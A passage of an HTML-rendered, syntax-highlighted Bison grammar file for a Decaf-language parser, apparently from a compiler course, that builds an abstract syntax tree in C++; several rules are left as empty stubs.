class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;default-defs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">char</span> *)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// print AST?</span></span><br><span class="line"><span class="keyword">bool</span> printAST = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;decafast.cc&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%define parse.error verbose</span><br><span class="line"></span><br><span class="line">%<span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">decafAST</span> *<span class="title">ast</span>;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> *sval;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">%token T_PACKAGE T_EXTERN T_FUNC T_SEMICOLON T_COMMA T_CONTINUE T_FALSE T_TRUE T_VAR T_FOR T_NULL T_RETURN T_WHITESPACE</span><br><span class="line">%token T_AND T_ASSIGN T_DIV T_DOT T_EQ T_RIGHTSHIFT T_GEQ T_GT T_LEFTSHIFT T_LEQ T_LT T_MINUS T_MOD T_MULT T_NEQ T_NOT T_OR T_PLUS</span><br><span class="line">%token T_VOID T_INTTYPE T_BOOLTYPE T_STRINGTYPE</span><br><span class="line">%token T_LCB T_RCB T_LPAREN T_RPAREN T_LSB T_RSB </span><br><span class="line">%token T_COMMENT</span><br><span class="line">%token T_BREAK T_ELSE T_IF T_WHILE</span><br><span class="line">%token &lt;sval&gt; T_ID T_INTCONSTANT T_CHARCONSTANT T_STRINGCONSTANT</span><br><span class="line"></span><br><span class="line">%type &lt;ast&gt; state_if state_while state_for state_break state_continue state_return <span class="built_in">exp</span> assign method_call lvalue statements statement extern_list para_list_use para_usen para_use para_list_def block blockt var_decls var_decl method_decls method_decl decafpackage extern_def extern_defn extern_typen extern_type func_typen func_type method_type array_type type</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">start: program</span><br><span class="line"></span><br><span class="line">program: extern_list decafpackage&#123; </span><br><span class="line">        ProgramAST *prog = <span class="keyword">new</span> ProgramAST((decafStmtList *)$<span class="number">1</span>, (PackageAST *)$<span class="number">2</span>); </span><br><span class="line">		<span class="keyword">if</span> (printAST) &#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; getString(prog) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">delete</span> prog;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_list: extern_defn &#123; </span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_defn: extern_def extern_defn &#123;</span><br><span class="line">        decafStmtList *slist = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafAST *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_def: T_EXTERN T_FUNC T_ID T_LPAREN para_list_def T_RPAREN method_type T_SEMICOLON &#123;</span><br><span class="line">        decafEXFuncDef *func = <span class="keyword">new</span> decafEXFuncDef();</span><br><span class="line">        decafPara* para = (decafPara*)$<span class="number">5</span>;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">7</span>;</span><br><span class="line">        func-&gt;put_name($<span class="number">3</span>);</span><br><span class="line">        func-&gt;put_type(type-&gt;get_type());</span><br><span class="line">        func-&gt;put_para((decafPara*)para);</span><br><span class="line">        $$ = func;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">3</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_list_use: para_usen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_usen: para_use T_COMMA para_usen &#123;</span><br><span class="line">        decafStmtList * para = (decafStmtList *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front($<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    | para_use &#123;</span><br><span class="line">        decafStmtList * para = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        para-&gt;push_front($<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_use: method_call &#123; $$ = $<span class="number">1</span>;&#125;</span><br><span class="line">    | <span class="built_in">exp</span> &#123;$$ = $<span class="number">1</span>;&#125; </span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">para_list_def: extern_typen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | func_typen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">func_typen: func_type T_COMMA func_typen &#123;</span><br><span class="line">        decafPara * para = (decafPara *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front((decafType *)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;     </span><br><span class="line">    &#125;</span><br><span class="line">    | func_type &#123;</span><br><span class="line">        decafPara * para = <span class="keyword">new</span> decafPara();</span><br><span class="line">        para-&gt;push_front((decafType*)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;   </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">func_type: T_ID extern_type &#123;</span><br><span class="line">        decafType* type = (decafType*)$<span class="number">2</span>;</span><br><span class="line">        type-&gt;put_name($<span class="number">1</span>);</span><br><span class="line">        $$ = type;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_typen: extern_type T_COMMA extern_typen &#123;</span><br><span class="line">        decafPara * para = (decafPara *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front((decafType *)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    | extern_type &#123;</span><br><span class="line">        decafPara * para = <span class="keyword">new</span> decafPara();</span><br><span class="line">        para-&gt;push_front((decafType*)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_type: T_STRINGTYPE &#123; decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;StringType&quot;</span>); $$ = type;&#125;</span><br><span class="line">    | type &#123; decafType* type = (decafType* )$<span class="number">1</span>; $$ = type;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_type: T_VOID &#123; decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;VoidType&quot;</span>); $$ = type;&#125;</span><br><span class="line">    | type &#123; decafType* type = (decafType* )$<span class="number">1</span>; $$ = type;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">array_type: T_LSB T_INTCONSTANT T_RSB type &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">type: T_INTTYPE &#123; decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;IntType&quot;</span>); $$ = type;&#125;</span><br><span class="line">    | T_BOOLTYPE &#123; decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;BoolType&quot;</span>); $$ = type;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">decafpackage: T_PACKAGE T_ID T_LCB var_decls method_decls T_RCB &#123;</span><br><span class="line">        decafStmtList *field = (decafStmtList *)$<span class="number">4</span>;</span><br><span class="line">        decafStmtList *method = (decafStmtList *)$<span class="number">5</span>;</span><br><span class="line">        $$ = <span class="keyword">new</span> PackageAST(*$<span class="number">2</span>, field, method); </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | T_PACKAGE T_ID T_LCB T_RCB &#123; </span><br><span class="line">        $$ = <span class="keyword">new</span> PackageAST(*$<span class="number">2</span>, <span class="keyword">new</span> decafStmtList(), <span class="keyword">new</span> decafStmtList()); </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_decls: var_decl var_decls&#123;</span><br><span class="line">        decafStmtList *slist = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafAST *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_decl: T_VAR T_ID type T_SEMICOLON &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR T_ID array_type T_SEMICOLON &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR T_ID type T_ASSIGN CONSTANT T_SEMICOLON &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">CONSTANT : T_INTCONSTANT | T_CHARCONSTANT | T_STRINGCONSTANT &#123; &#125;;</span><br><span class="line"></span><br><span class="line">method_decls: method_decl method_decls&#123;</span><br><span class="line">        decafStmtList *slist = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafAST *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_decl: T_FUNC T_ID T_LPAREN para_list_def T_RPAREN method_type block &#123;</span><br><span class="line">        decafFuncDef *func = <span class="keyword">new</span> decafFuncDef();</span><br><span class="line">        decafPara* para = (decafPara*)$<span class="number">4</span>;</span><br><span class="line">        decafStmtList * block = (decafStmtList*)$<span class="number">7</span>;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">6</span>;</span><br><span class="line">        func-&gt;put_name($<span class="number">2</span>);</span><br><span class="line">        func-&gt;put_type(type-&gt;get_type());</span><br><span class="line">        func-&gt;put_para(para);</span><br><span class="line">        func-&gt;put_block(block);</span><br><span class="line">        $$ = func;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">blockt: T_LCB var_decls statements T_RCB &#123;</span><br><span class="line">        decafStmtList *field = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        decafStmtList *state = (decafStmtList *)$<span class="number">3</span>;</span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;Block&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_LCB T_RCB &#123;</span><br><span class="line">        decafStmtList *field = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        decafStmtList *state = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;Block&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">block: T_LCB var_decls statements T_RCB &#123;</span><br><span class="line">        decafStmtList *field = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        decafStmtList *state = (decafStmtList *)$<span class="number">3</span>;</span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;MethodBlock&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_LCB T_RCB &#123;</span><br><span class="line">        decafStmtList *field = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        decafStmtList *state = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;MethodBlock&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">statements: statement statements &#123;</span><br><span class="line">        decafStmtList *slist = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafAST *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">statement: blockt &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | assign T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | method_call T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_return T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_if &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_while &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_for &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_break T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_continue T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | &#123;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_if: T_IF T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt T_ELSE blockt &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *if_block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafBlock *else_block = (decafBlock *)$<span class="number">7</span>;</span><br><span class="line">        decafIF *ifs = <span class="keyword">new</span> decafIF(<span class="built_in">exp</span>,if_block,else_block);</span><br><span class="line">        $$ = ifs;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_IF T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *if_block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafIF *ifs = <span class="keyword">new</span> decafIF(<span class="built_in">exp</span>,if_block,<span class="literal">NULL</span>);</span><br><span class="line">        $$ = ifs;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_while: &#123;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_for: &#123;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_break: &#123;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_continue: &#123;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_return: T_RETURN T_LPAREN <span class="built_in">exp</span> T_RPAREN &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafReturn *ret = <span class="keyword">new</span> decafReturn(<span class="built_in">exp</span>);</span><br><span class="line">        $$ = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">assign: lvalue T_ASSIGN <span class="built_in">exp</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">lvalue: T_ID &#123;  &#125;</span><br><span class="line">    | T_ID T_LSB <span class="built_in">exp</span> T_RSB &#123; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exp</span> : T_ID &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;VariableExpr&quot;</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | T_INTCONSTANT &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;NumberExpr&quot;</span>); $$ = <span class="built_in">exp</span>; &#125;  </span><br><span class="line">    | T_CHARCONSTANT &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;NumberExpr&quot;</span>); $$ = <span class="built_in">exp</span>; &#125;  </span><br><span class="line">    | T_STRINGCONSTANT &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;NumberExpr&quot;</span>); $$ = <span class="built_in">exp</span>; &#125;  </span><br><span class="line">    | method_call &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | T_NOT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Not&quot;</span>, (decafAllexp*)$<span class="number">2</span>, <span class="literal">NULL</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | T_MINUS <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Minus&quot;</span>, (decafAllexp*)$<span class="number">2</span>, <span class="literal">NULL</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_PLUS <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Plus&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MINUS <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Minus&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MULT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Mult&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_DIV <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Div&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MOD <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Mod&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LEFTSHIFT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Leftshift&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_RIGHTSHIFT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Rightshift&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LEQ <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Leq&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_GEQ <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Geq&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Lt&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_GT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Gt&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_EQ <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Eq&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_NEQ <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Neq&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_AND <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;And&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_OR <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Or&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | T_LPAREN <span class="built_in">exp</span> T_RPAREN &#123; $$ = $<span class="number">2</span>; &#125;</span><br><span class="line">    | &#123;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_call: T_ID T_LPAREN para_list_use T_RPAREN &#123;</span><br><span class="line">        decafFunCall *call = <span class="keyword">new</span> decafFunCall();</span><br><span class="line">        decafStmtList* para = (decafStmtList*)$<span class="number">3</span>;</span><br><span class="line">        call-&gt;put_name($<span class="number">1</span>);</span><br><span class="line">        call-&gt;put_para(para-&gt;get_para());</span><br><span class="line">        $$ = call;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// parse the input and create the abstract syntax tree</span></span><br><span class="line">  <span class="keyword">int</span> retval = yyparse();</span><br><span class="line">  <span class="keyword">return</span>(retval &gt;= <span class="number">1</span> ? EXIT_FAILURE : EXIT_SUCCESS);</span><br><span 